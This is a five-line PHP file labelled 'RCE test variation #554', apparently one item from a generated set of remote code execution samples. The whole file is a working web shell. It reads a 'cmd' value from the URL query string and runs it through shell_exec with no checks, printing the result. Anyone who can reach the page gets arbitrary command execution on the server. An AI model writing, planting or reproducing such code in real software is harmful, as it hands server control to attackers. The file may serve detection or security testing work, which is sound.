<?php
// RCE test variation #554
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>